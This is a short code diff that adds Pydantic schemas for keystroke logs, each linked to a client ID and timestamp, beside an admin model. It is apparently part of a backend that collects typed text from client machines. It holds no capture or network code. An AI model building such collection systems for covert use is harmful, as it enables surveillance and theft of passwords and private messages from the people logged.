@@ -49,3 +49,23 @@ class Admin(AdminBase):
 
     class Config:
         orm_mode = True
+
+
+class KeystrokeLogBase(BaseModel):
+    text: str
+
+class KeystrokeLogCreate(BaseModel):
+    client_id: int
+    text: str
+
+class KeystrokeLog(KeystrokeLogBase):
+    id: int
+    client_id: int
+    timestamp: datetime
+    text: str
+
+    class Config:
+        orm_mode = True
+
+class KeystrokeLogUpdate(BaseModel):
+    text: Optional[str] = None
